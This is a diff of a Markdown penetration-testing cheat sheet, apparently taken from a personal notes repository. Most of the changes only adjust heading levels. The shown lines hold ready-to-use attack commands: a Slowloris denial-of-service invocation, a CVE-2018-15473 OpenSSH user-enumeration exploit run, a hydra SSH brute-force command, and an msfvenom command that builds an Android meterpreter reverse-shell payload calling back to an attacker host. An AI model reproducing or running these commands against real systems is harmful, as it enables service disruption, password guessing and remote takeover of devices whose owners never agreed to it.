@@ -1,5 +1,4 @@
 
-# OSI Layer
 ## OSI Layer
 
 | No | Layer | Example |
@@ -12,13 +11,13 @@
 | 2 | Data Link | Switch |
 | 1 | Physical | Hub, NIC, Cable |
 
-# Denial Of Service
-## Slowloris (GET Exploit)
+## Denial Of Service
+Slowloris (GET Exploit)
 Perl Example
 ```
 perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache
 ``` 
-## Slowloris Python (GET Exploit)
+Slowloris Python (GET Exploit)
 Source : https://github.com/gkbrk/slowloris
 -----
 Install
@@ -95,7 +94,6 @@ nbtscan [NETWORK_IP]
 # Brute Force SSH (OpenSSH 2.3 < 7.7)
 ## Brute Force CVE-2018-15473
 Source : https://www.exploit-db.com/exploits/45233
----
 Running Exploit 
 ```
 python3 45233.py --userList user.txt [IP_TARGET] --outputFile hasil.txt
@@ -105,6 +103,7 @@ hydra -L user.txt -P pass.txt [IP_TARGET] ssh
 # Metasploit
 ## Payload Msvenom
 Payload Reverse Shell
+
 | Target | Example |
 | --- | --- |
 | Android | msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=4444 R > payload.apk |
